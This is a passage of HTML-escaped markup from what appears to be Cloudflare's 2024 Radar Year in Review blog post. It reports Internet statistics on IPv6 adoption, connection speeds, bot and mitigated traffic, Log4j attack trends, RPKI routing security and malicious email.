href="https://radar.cloudflare.com/year-in-review/2024/my#ipv6-adoption"&gt;&lt;u&gt;Malaysia&lt;/u&gt;&lt;/a&gt;, where 59.6% of dual-stacked requests were made over IPv6 during 2024, thanks to &lt;a href="https://radar.cloudflare.com/explorer?dataSet=http&amp;amp;groupBy=ases&amp;amp;loc=MY&amp;amp;dt=14d&amp;amp;metric=ip_version%2FIPv6"&gt;&lt;u&gt;strong IPv6 adoption rates across leading Internet providers&lt;/u&gt;&lt;/a&gt; within the country. IPv6 adoption in India was up from 66% in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/in?previousYear=true#ipv6-adoption"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;, and in Malaysia, it was up from 57.3% &lt;a href="https://radar.cloudflare.com/year-in-review/2024/my?previousYear=true#ipv6-adoption"&gt;&lt;u&gt;last year&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sa#ipv6-adoption"&gt;&lt;u&gt;Saudi Arabia&lt;/u&gt;&lt;/a&gt; was the only other country with an IPv6 adoption rate above 50% this year, at 51.8%, whereas that list also included &lt;a href="https://radar.cloudflare.com/year-in-review/2023/vn#ipv6-adoption"&gt;&lt;u&gt;Vietnam&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/gr#ipv6-adoption"&gt;&lt;u&gt;Greece&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/fr#ipv6-adoption"&gt;&lt;u&gt;France&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/uy#ipv6-adoption"&gt;&lt;u&gt;Uruguay&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2023/th#ipv6-adoption"&gt;&lt;u&gt;Thailand&lt;/u&gt;&lt;/a&gt; in 2023. Thirty four countries/regions, including many in Africa, still have IPv6 adoption rates below 1%, while a total of 96 countries/regions have adoption rates below 10%.&lt;/p&gt;

            &lt;h3&gt;The top 10 countries ranked by Internet speed all had average download speeds above 200 Mbps. Spain was consistently among the top locations across measured Internet quality metrics.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-top-10-countries-ranked-by-internet-speed-all-had-average-download-speeds-above-200-mbps-spain-was-consistently-among-the-top-locations-across-measured-internet-quality-metrics"&gt;

          &lt;/div&gt;
        &lt;p&gt;As more and more of our everyday lives move online, including entertainment, work, education, finance, shopping, and even basic social and personal interaction, the quality of our Internet connections is arguably more important than ever, necessitating higher connection speeds and lower latency. Although Internet providers continue to evolve their service portfolios to offer increased connection speeds and reduced latency in order to support growth in use cases like videoconferencing, live streaming, and online gaming, consumer adoption is often mixed due to cost, availability, or other issues. By aggregating the results of &lt;a href="https://speed.cloudflare.com/"&gt;&lt;u&gt;speed.cloudflare.com&lt;/u&gt;&lt;/a&gt; tests taken during 2024, we can get a geographic perspective on &lt;a href="https://developers.cloudflare.com/radar/glossary/#connection-quality"&gt;&lt;u&gt;connection quality&lt;/u&gt;&lt;/a&gt; metrics including average download and upload speeds, and average idle and loaded latencies, as well as the distribution of the measurements.&lt;/p&gt;&lt;p&gt;In &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-quality"&gt;&lt;u&gt;2024&lt;/u&gt;&lt;/a&gt;, Spain was a leader in download speed (292.6 Mbps) and upload speed (192.6 Mbps) metrics, and placed second globally for loaded latency (78.6 ms). (Loaded latency is the round-trip time when data-heavy applications are being used on the network.) Spain’s leadership in these connection quality metrics is supported by the strong progress that the country has made &lt;a href="https://ec.europa.eu/newsroom/dae/redirection/document/106695"&gt;&lt;u&gt;towards achieving the EU’s “Digital Decade” objectives&lt;/u&gt;&lt;/a&gt;, including fixed very high capacity network (VHCN) deployment, fiber-to-the-premises (FTTP) coverage, and 5G coverage with the latter two &lt;a href="https://www.trade.gov/country-commercial-guides/spain-digital-economy"&gt;&lt;u&gt;reaching&lt;/u&gt;&lt;/a&gt; 95.2% and 92.3% respectively. High speed fiber broadband connections are also relatively affordable, with research showing major providers offering 100 Mbps, 300 Mbps, 600 Mbps, and 1 Gbps packages, with the latter priced between €30 and €46 per month. The figures below for &lt;a href="https://radar.cloudflare.com/year-in-review/2024/es#internet-quality"&gt;&lt;u&gt;Spain&lt;/u&gt;&lt;/a&gt; show the largest clusters of speed measurements around the 100 Mbps mark, with slight bumps also visible around 300 Mbps, suggesting that the former package has the highest subscription rate, followed by the latter. Further, they show these connections are also relatively low latency, with 87% of idle latency measurements below 50 ms and 65% of loaded latency measurements below 100 ms, providing users with good &lt;a href="https://www.screenbeam.com/wifihelp/wifibooster/how-to-reduce-latency-or-lag-in-gaming-2/#:~:text=Latency%20is%20measured%20in%20milliseconds,%2C%2020%2D40ms%20is%20optimal."&gt;&lt;u&gt;gaming&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.haivision.com/glossary/video-latency/#:~:text=Low%20latency%20is%20typically%20defined,and%20streaming%20previously%20recorded%20events."&gt;&lt;u&gt;videoconferencing/streaming&lt;/u&gt;&lt;/a&gt; experiences.&lt;/p&gt;

        &lt;p&gt;With approximately &lt;a href="https://www.statista.com/topics/840/smartphones/#topicOverview"&gt;&lt;u&gt;70% of the world’s population using smartphones&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.pewresearch.org/internet/fact-sheet/mobile/"&gt;&lt;u&gt;91% of Americans owning a smartphone&lt;/u&gt;&lt;/a&gt;, these mobile devices have become an integral part of both our personal and professional lives, providing us with Internet access from nearly any place at any time. In some countries/regions, mobile devices primarily connect to the Internet via Wi-Fi, while other countries/regions are “mobile first”, where 4G/5G services are the primary means of Internet access.&lt;/p&gt;&lt;p&gt;Analysis of information contained with the user agent reported with each request to Cloudflare enables us to categorize it as coming from a mobile, desktop, or other type of device. Aggregating this categorization throughout the year at a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#mobile-vs-desktop"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, we found that 41.3% of traffic came from mobile devices, with 58.7% coming from desktop devices such as laptops and “classic” PCs. These traffic shares were in line with those measured in both &lt;a href="https://radar.cloudflare.com/year-in-review/2023#mobile-vs-desktop"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt; and 2022, suggesting that mobile device usage has achieved a “steady state”. Over 77% of traffic came from mobile devices in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sd#mobile-vs-desktop"&gt;&lt;u&gt;Sudan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cu#mobile-vs-desktop"&gt;&lt;u&gt;Cuba&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sy#mobile-vs-desktop"&gt;&lt;u&gt;Syria&lt;/u&gt;&lt;/a&gt;, making them the countries/regions with the largest mobile device traffic share in 2024. Other countries/regions that had more than 50% of traffic come from mobile devices were concentrated in the Middle East/Africa, the Asia Pacific region, and South/Central America. &lt;/p&gt;

            &lt;h3&gt;20.7% of TCP connections are unexpectedly terminated before any useful data can be exchanged.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#20-7-of-tcp-connections-are-unexpectedly-terminated-before-any-useful-data-can-be-exchanged"&gt;

          &lt;/div&gt;
        &lt;p&gt;Cloudflare is in a unique position to help measure the health and behaviors of Internet networks around the world. One way we do this is passively measuring rates of connections to Cloudflare that appear &lt;i&gt;anomalous&lt;/i&gt;, meaning that they are unexpectedly terminated before any useful data exchange occurs. The underlying causes of connection anomalies are varied and range from DoS attacks to quirky client behavior to third-party connection tampering (e.g., when a network monitors and selectively disrupts connections to filter content).&lt;/p&gt;&lt;p&gt;Connection anomalies are symptoms — visible signs that “something abnormal” is happening in a network, but the underlying root cause is not always clear from the outset. However, we can gain a better understanding by incorporating previously-reported network behaviors, active measurements and on-the-ground reports, and macro trends across networks. Additional details on such analysis can be found in the blog posts &lt;a href="https://blog.cloudflare.com/connection-tampering/"&gt;&lt;i&gt;&lt;u&gt;A global assessment of third-party connection tampering&lt;/u&gt;&lt;/i&gt;&lt;/a&gt; and&lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt; &lt;i&gt;&lt;u&gt;Bringing insights into TCP resets and timeouts to Cloudflare Radar&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Insights into TCP connection anomalies were &lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt;&lt;u&gt;launched on Cloudflare Radar&lt;/u&gt;&lt;/a&gt; in September, with the plot lines in the associated graph corresponding to the stage of the TCP connection in which the connection anomalously closed (using shorthand, the first three messages we typically receive from the client in a TCP connection are “SYN” and “ACK” packets to establish a connection, and then a “PSH” packet indicating the requested resource). In aggregate &lt;a href="https://radar.cloudflare.com/year-in-review/2024#tcp-connection-anomalies"&gt;&lt;u&gt;globally&lt;/u&gt;&lt;/a&gt;, over 20% of connections to Cloudflare were terminated unexpectedly, with the largest share (nearly half) being closed “Post SYN” — that is, after our server has received a client’s SYN packet, but before we have received a subsequent acknowledgement (ACK) from the client or any useful data that would follow the acknowledgement. These terminations can often be attributed to DoS attacks or Internet scanning. Post-ACK (3.1% globally) and Post-PSH (1.4% globally) anomalies are more often associated with connection tampering, especially when they occur at high rates in specific networks.&lt;/p&gt;

            &lt;h3&gt;6.5% of global traffic was mitigated by Cloudflare's systems as being potentially malicious or for customer-defined reasons.&lt;/h3&gt;

          &lt;/div&gt;
        &lt;p&gt;To &lt;a href="https://www.cloudflare.com/products/zero-trust/threat-defense/"&gt;&lt;u&gt;protect customers from threats&lt;/u&gt;&lt;/a&gt; posed by malicious bots used to attack websites and applications, Cloudflare mitigates this attack traffic using &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;DDoS&lt;/u&gt;&lt;/a&gt; mitigation techniques or &lt;a href="https://developers.cloudflare.com/waf/managed-rules/"&gt;&lt;u&gt;Web Application Firewall (WAF) Managed Rules&lt;/u&gt;&lt;/a&gt;. For a variety of other reasons, customers may also want Cloudflare to mitigate traffic using techniques like &lt;a href="https://developers.cloudflare.com/waf/rate-limiting-rules/"&gt;&lt;u&gt;rate-limiting&lt;/u&gt;&lt;/a&gt; requests, or &lt;a href="https://developers.cloudflare.com/waf/tools/ip-access-rules/"&gt;&lt;u&gt;blocking all traffic from a given location&lt;/u&gt;&lt;/a&gt;, even if it isn’t malicious. Analyzing traffic to Cloudflare’s network throughout 2024, we looked at the overall share that was mitigated for any reason, as well as the share that was blocked as a DDoS attack or by WAF Managed Rules. &lt;/p&gt;&lt;p&gt;In 2024, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#mitigated-traffic"&gt;&lt;u&gt;6.5% of global traffic was mitigated&lt;/u&gt;&lt;/a&gt;, up almost one percentage point from &lt;a href="https://radar.cloudflare.com/year-in-review/2023#mitigated-traffic"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;. Just 3.2% was mitigated as a DDoS attack, or by WAF Managed Rules, a rate slightly higher than in 2023. More than 10% of the traffic originating from 44 countries/regions had mitigations generally applied, while DDoS/WAF mitigations were applied to more than 10% of the traffic originating from just seven countries/regions.&lt;/p&gt;&lt;p&gt;At a country/region level, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/al#mitigated-traffic"&gt;&lt;u&gt;Albania&lt;/u&gt;&lt;/a&gt; had one of the highest mitigated traffic shares throughout the year, at 42.9%, while &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ly#mitigated-traffic"&gt;&lt;u&gt;Libya&lt;/u&gt;&lt;/a&gt; had one of the highest shares of traffic that was mitigated as a DDoS attack or by WAF Managed Rules, at 19.2%. In &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#just-under-6-of-global-traffic-was-mitigated-by-cloudflares-systems-as-being-potentially-malicious-or-for-customer-defined-reasons-in-the-united-states-3-65-of-traffic-was-mitigated-while-in-south-korea-it-was-8-36"&gt;&lt;u&gt;2023’s Year in Review blog post&lt;/u&gt;&lt;/a&gt;, we highlighted the United States and Korea. This year, the share of mitigated traffic grew to 5.0% in the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/us#mitigated-traffic"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt; (up from 3.65% in 2023), while in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/kr#mitigated-traffic"&gt;&lt;u&gt;South Korea&lt;/u&gt;&lt;/a&gt;, it dropped slightly to 8.1%, down from 8.36%.&lt;/p&gt;

          &lt;div&gt;
            &lt;h3&gt;The United States was responsible for over a third of global bot traffic. Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google.&lt;/h3&gt;

        &lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;Bot&lt;/u&gt;&lt;/a&gt; traffic describes any non-human Internet traffic, and by monitoring traffic suspected to be from bots site and application owners can spot and, if necessary, block potentially malicious activity. However, not all bots are malicious — bots can also be helpful, and Cloudflare maintains a list of &lt;a href="https://radar.cloudflare.com/traffic/verified-bots"&gt;&lt;u&gt;verified bots&lt;/u&gt;&lt;/a&gt; that includes those used for things like search engine indexing, performance testing, and &lt;a href="https://www.cloudflare.com/application-services/solutions/app-performance-monitoring/"&gt;&lt;u&gt;availability monitoring&lt;/u&gt;&lt;/a&gt;. Regardless of intent, we analyzed where bot traffic was originating from in 2024, using the IP address of a request to identify the network (&lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system&lt;/u&gt;&lt;/a&gt;) and country/region associated with the bot making the request. Cloud platforms remained among the leading sources of bot traffic due to a number of factors. These include the ease of using automated tools to quickly provision compute resources, the relatively low cost of using these compute resources in an ephemeral manner, the broadly distributed geographic footprint of cloud platforms, and the platforms’ high-bandwidth Internet connectivity.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#bot-traffic-sources"&gt;&lt;u&gt;Globally&lt;/u&gt;&lt;/a&gt;, we found that 68.5% of observed bot traffic came from the top 10 countries in 2024, with the United States responsible for half of that total, over 5x the share of second place Germany. (In comparison to 2023, the US share was up slightly, while Germany’s was down slightly.) Among cloud platforms that originate bot traffic, Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google. Microsoft, Hetzner, Digital Ocean, and OVH all also contributed more than a percent each.&lt;/p&gt;

            &lt;h3&gt;Globally, Gambling/Games was the most attacked industry, slightly ahead of 2023’s most targeted industry, Finance.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-gambling-games-was-the-most-attacked-industry-slightly-ahead-of-2023s-most-targeted-industry-finance"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The industries targeted by attacks often shift over time, depending on the intent of the attackers. They may be trying to cause financial harm by attacking ecommerce sites during a busy shopping period, gain an advantage against opponents by attacking an online game, or make a political statement by attacking government-related sites. To identify industry-targeted attack activity during 2024, we analyzed mitigated traffic for customers that had an associated industry and vertical within their customer record. Mitigated traffic was aggregated weekly by source country/region across 19 target industries.&lt;/p&gt;&lt;p&gt;Companies in the Gambling/Games industry were, in aggregate, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#most-attacked-industries"&gt;&lt;u&gt;most attacked during 2024&lt;/u&gt;&lt;/a&gt;, with 6.6% of global mitigated traffic targeting the industry. The industry was slightly ahead of Finance, which led 2023’s aggregate list. (Both industries are shown at 6.6% in the Summary view due to rounding.)  Gambling/Games sites saw the largest shares of mitigated traffic in January and the first week of February, possibly related to National Football League playoffs in the United States, heading into the &lt;a href="https://blog.cloudflare.com/super-bowl-lviii/"&gt;&lt;u&gt;Super Bowl&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Attacks targeting Finance organizations were most active in May, reaching a peak of 15.3% of mitigated traffic the week of May 13. This is in line with the figure in our &lt;a href="https://radar.cloudflare.com/reports/ddos-2024-q2#id-9-top-attacked-industries"&gt;&lt;i&gt;&lt;u&gt;DDoS threat report for Q2 2024&lt;/u&gt;&lt;/i&gt;&lt;/a&gt; that shows that Financial Services was the most attacked industry by request volume during the quarter in South America and the Middle East region.&lt;/p&gt;&lt;p&gt;As we have seen in the past, peak attack activity varied by industry on a weekly basis. The highest peaks for the year were seen in attacks targeting People &amp;amp; Society organizations (19.6% of mitigated traffic, week of January 1), the Autos &amp;amp; Vehicles industry (29.7% of mitigated traffic, week of January 15), and the Real Estate industry (27.5% of mitigated traffic, week of August 26).&lt;/p&gt;

          &lt;/div&gt;
        &lt;p&gt;In December 2021, we published a &lt;a href="https://blog.cloudflare.com/tag/log4j/"&gt;&lt;u&gt;series of blog posts about the Log4j vulnerability&lt;/u&gt;&lt;/a&gt;, highlighting the threat that it posed, our observations of attempted exploitation, and the steps we took to protect customers. Two years on, in our &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023 Year in Review&lt;/u&gt;&lt;/a&gt;, we &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#even-as-an-older-vulnerability-log4j-remained-a-top-target-for-attacks-during-2023-however-http-2-rapid-reset-emerged-as-a-significant-new-vulnerability-beginning-with-a-flurry-of-record-breaking-attacks"&gt;&lt;u&gt;noted&lt;/u&gt;&lt;/a&gt; that even as an older vulnerability, Log4j remained a top target for attacks during 2023, with related attack activity significantly higher than other commonly exploited vulnerabilities.&lt;/p&gt;&lt;p&gt;In 2024, three years after the initial Log4j disclosure, we found that Log4j remains an active threat. This year, we compared normalized daily attack activity for Log4j with attack activity for Atlassian Confluence Code Injection, a vulnerability we &lt;a href="https://radar.cloudflare.com/year-in-review/2023#commonly-exploited-vulnerabilities"&gt;&lt;u&gt;examined in the 2023 Year in Review&lt;/u&gt;&lt;/a&gt;, as well as aggregated daily attack activity for multiple &lt;a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures"&gt;&lt;u&gt;CVEs&lt;/u&gt;&lt;/a&gt; related to &lt;a href="https://capec.mitre.org/data/definitions/115.html"&gt;&lt;u&gt;Authentication Bypass&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-remote-code-execution/"&gt;&lt;u&gt;Remote Code Execution&lt;/u&gt;&lt;/a&gt; vulnerabilities published in 2024.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#commonly-exploited-vulnerabilities"&gt;&lt;u&gt;Log4j attack activity&lt;/u&gt;&lt;/a&gt; appeared to trend generally upwards across the year, with several significant spikes visible during the first half of the year, and then again in October and November. In terms of the difference in activity, Log4j ranges from approximately 4x to over 20x the activity seen for Atlassian Confluence Code Injection, and as much as 100x the aggregated activity seen for Authentication Bypass or Remote Code Injection vulnerabilities.  &lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global attack activity trends for commonly exploited vulnerabilities in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Routing security, measured as the share of RPKI valid routes and the share of covered IP address space, continued to improve globally throughout 2024. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#routing-security-measured-as-the-share-of-rpki-valid-routes-and-the-share-of-covered-ip-address-space-continued-to-improve-globally-throughout-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As the routing protocol that underpins the Internet, &lt;a href="https://www.cloudflare.com/learning/security/glossary/what-is-bgp/"&gt;&lt;u&gt;Border Gateway Protocol (BGP)&lt;/u&gt;&lt;/a&gt; communicates routes between networks, enabling traffic to flow between source and destination. BGP, however, relies on trust between networks, and incorrect information shared between peers, whether or not it was shared intentionally, can send traffic to the wrong place, potentially with &lt;a href="https://blog.cloudflare.com/bgp-leaks-and-crypto-currencies/"&gt;&lt;u&gt;malicious results&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://blog.cloudflare.com/rpki/"&gt;&lt;u&gt;Resource Public Key Infrastructure (RPKI)&lt;/u&gt;&lt;/a&gt; is a cryptographic method of signing records that associate a BGP route announcement with the correct originating autonomous system (AS) number, providing a way of ensuring that the information being shared originally came from a network that is allowed to do so. (It is important to note that this is only half of the challenge of implementing routing security, because network providers also need to validate these signatures and filter out invalid announcements to prevent sharing them further.)&lt;/p&gt;&lt;p&gt;Cloudflare has long been an advocate for routing security, including being a founding participant in the &lt;a href="https://www.manrs.org/2020/03/new-category-of-cdns-and-cloud-providers-join-manrs-to-improve-routing-security/"&gt;&lt;u&gt;MANRS CDN and Cloud Programme&lt;/u&gt;&lt;/a&gt; and providing a &lt;a href="https://isbgpsafeyet.com/"&gt;&lt;u&gt;public tool&lt;/u&gt;&lt;/a&gt; that enables users to test whether their Internet provider has implemented BGP safely. Building on insights available in the &lt;a href="https://radar.cloudflare.com/routing"&gt;&lt;u&gt;Routing page&lt;/u&gt;&lt;/a&gt; on Cloudflare Radar, we analyzed data from &lt;a href="https://ftp.ripe.net/rpki/"&gt;&lt;u&gt;RIPE NCC's RPKI daily archive&lt;/u&gt;&lt;/a&gt; to determine the share of RPKI valid routes (as opposed to those route announcements that are &lt;a href="https://rpki.readthedocs.io/en/latest/about/help.html"&gt;&lt;u&gt;invalid or whose status is unknown&lt;/u&gt;&lt;/a&gt;) and how that share has changed over the course of 2024, as well as determining the share of IP address space covered by valid routes. The latter metric is of interest because a route announcement covering a significant amount of IP address space (millions of IPv4 addresses, for example) has a greater potential impact than an announcement covering a small block of IP address space (hundreds of IPv4 addresses, for example).&lt;/p&gt;&lt;p&gt;At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#routing-security"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level during 2024, we saw a 6.4 percentage point increase (from 43.4% to 49.8%) in valid IPv4 routes, and a 3.2 percentage point increase (from 53.7% to 56.9%) in valid IPv6 routes. Given the trajectory, it is likely that over half of IPv4 routes will be RPKI valid by the end of calendar year 2024. Looking at the global share of IP address space covered by valid routes, we saw a 4.7 percentage point increase (from 38.9% to 43.6%) for IPv4, and a 3.3 percentage point increase (from 57.6% to 60.9%) for IPv6.&lt;/p&gt;

However, the share of valid routes grew significantly on February 15, when &lt;a href="https://radar.cloudflare.com/as12479"&gt;&lt;u&gt;AS12479 (Orange Espagne)&lt;/u&gt;&lt;/a&gt; signed records associated with 98% of their IP address prefixes that were previously in an &lt;a href="https://www.ripe.net/manage-ips-and-asns/resource-management/rpki/bgp-origin-validation/"&gt;&lt;u&gt;“unknown” (or NotFound) state of RPKI validity&lt;/u&gt;&lt;/a&gt;, thus converting these prefixes from unknown to valid. That drove an immediate increase for IPv4 to 76%, reaching 81% validity by December 1, and an immediate increase for IPv6 to 91%, reaching 92.9% validity by December 1. A notable change in covered IP address space was observed in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cm#routing-security"&gt;&lt;u&gt;Cameroon&lt;/u&gt;&lt;/a&gt;, where covered IPv4 space more than doubled at the end of January, growing from 32% to 82%. This was due to &lt;a href="https://radar.cloudflare.com/as36912"&gt;&lt;u&gt;AS36912 (Orange Cameroun)&lt;/u&gt;&lt;/a&gt; signing records associated with all of their IPv4 address prefixes, changing the associated IP address space to RPKI valid. &lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7vC1TSUDDHpepgs2Yv3Lpx/eb43b5c0a203d7ec0a74939c23684ae5/2627_Shield_Plane.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;An average of 4.3% of emails were determined to be malicious in 2024. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#an-average-of-4-3-of-emails-were-determined-to-be-malicious-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Despite the growing enterprise use of collaboration/messaging apps, email remains an important business application and is a very attractive entry point into enterprise networks for attackers. Attackers will send targeted malicious emails that attempt to impersonate an otherwise legitimate sender (such as a corporate executive), that try to get the user to click on a deceptive link, or that contain a dangerous attachment, among other types of threats. &lt;a href="https://www.cloudflare.com/zero-trust/products/email-security/"&gt;&lt;u&gt;Cloudflare Email Security&lt;/u&gt;&lt;/a&gt; protects customers from email-based attacks, including those carried out through targeted malicious email messages. During&lt;a href="https://radar.cloudflare.com/year-in-review/2024#malicious-emails"&gt;&lt;u&gt; 2024&lt;/u&gt;&lt;/a&gt;, an average of 4.3% of emails analyzed by Cloudflare were found to be malicious. Aggregated at a weekly level, spikes above 14% were seen in late March, early April, and mid-May. We believe that these spikes were related to targeted “backscatter” attacks, where the attacker flooded a target with undeliverable messages, which then bounced the messages to the victim, whose email had been set as the reply-to: address.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/693EaEyePShBH8CZ7cZWv1/c08e0acd6f8a6a15b730b1cd90bf6283/email_-_malicious_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global malicious email share trends in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Deceptive links and identity deception were the two most common types of threats found in malicious email messages. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#deceptive-links-and-identity-deception-were-the-two-most-common-types-of-threats-found-in-malicious-email-messages"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Attackers use a variety of techniques, which we refer to as threat categories, when they use malicious email messages as an attack vector. These categories are defined and explored in detail in our &lt;a href="https://blog.cloudflare.com/2023-phishing-report/"&gt;&lt;u&gt;phishing threats report&lt;/u&gt;&lt;/a&gt;. In our analysis of malicious emails, we have found that such messages may contain multiple types of threats. In reviewing a weekly aggregation of threat activity trends for these categories, we found that, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#top-email-threats"&gt;&lt;u&gt;averaged across 2024&lt;/u&gt;&lt;/a&gt;, 42.9% of malicious email messages contained deceptive links, with the share reaching 70% at times throughout the year. Activity for this thread category was spiky, with low points seen in the March to May timeframe, and a general downward trend visible from July through November.&lt;/p&gt;&lt;p&gt;Identity deception was a similarly active threat category, with such threats also found in up to 70% of analyzed emails several weeks throughout the year. Averaged across 2024, 35.1% of emails contained attempted identity deception. The activity pattern for this threat category appears to be somewhat similar to deceptive links, with a number of the peaks and valleys occurring during the same weeks. At times, identity deception was a more prevalent threat in analyzed emails than deceptive links, as seen in the graph below.&lt;/p&gt;&lt;p&gt;Among other threat categories, extortion saw the most significant change throughout the year. After being found in 86% of malicious emails during the first week of January, its share gradually trended lower throughout the year, finishing November under 10%.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global malicious email threat category trends for Deceptive Links and Identity Deception in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Over 99% of the email messages processed by Cloudflare Email Security from the .bar, .rest, and .uno top level domains (TLDs) were found to be either spam or malicious in nature.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#over-99-of-the-email-messages-processed-by-cloudflare-email-security-from-the-bar-rest-and-uno-top-level-domains-tlds-were-found-to-be-either-spam-or-malicious-in-nature"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In March 2024, we &lt;a href="https://blog.cloudflare.com/email-security-insights-on-cloudflare-radar/"&gt;&lt;u&gt;launched a set of email security insights on Cloudflare Radar&lt;/u&gt;&lt;/a&gt;, including visibility into so-called “dangerous domains” — those top level domains (TLDs) that were found to be the sources of the most spam or malicious email among messages analyzed by Cloudflare Email Security. The analysis is based on the sending domain’s TLD, found in the &lt;code&gt;From&lt;/code&gt;: header of an email message. For example, if a message came from &lt;code&gt;sender@example.com&lt;/code&gt;, then &lt;code&gt;example.com&lt;/code&gt; is the sending domain, and .com is the associated TLD.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#most-observed-tlds"&gt;&lt;u&gt;In aggregate across 2024&lt;/u&gt;&lt;/a&gt;, we found that the &lt;a href="https://icannwiki.org/.bar"&gt;&lt;code&gt;&lt;u&gt;.bar&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://icannwiki.org/.rest"&gt;&lt;code&gt;&lt;u&gt;.rest&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, and &lt;a href="https://icannwiki.org/.uno"&gt;&lt;code&gt;&lt;u&gt;.uno&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; TLDs were the “most dangerous”, each with over 99% of analyzed email messages characterized as either spam or malicious. (These TLDs are all at least a decade old, and each sees at least some usage, with &lt;a href="https://research.domaintools.com/statistics/tld-counts/"&gt;&lt;u&gt;between 20,000 and 60,000 registered domain names&lt;/u&gt;&lt;/a&gt;.)  Sorting by malicious email share, the &lt;a href="https://icannwiki.org/.ws"&gt;&lt;code&gt;&lt;u&gt;.ws&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; ccTLD (country code top level domain) belonging to Western Samoa came out on top, with over 90% of analyzed emails categorized as malicious. Sorting by spam email share, &lt;a href="https://icannwiki.org/.quest"&gt;&lt;code&gt;&lt;u&gt;.quest&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; is the biggest offender, with over 88% of emails originating from associated domains characterized as spam.&lt;/p&gt;
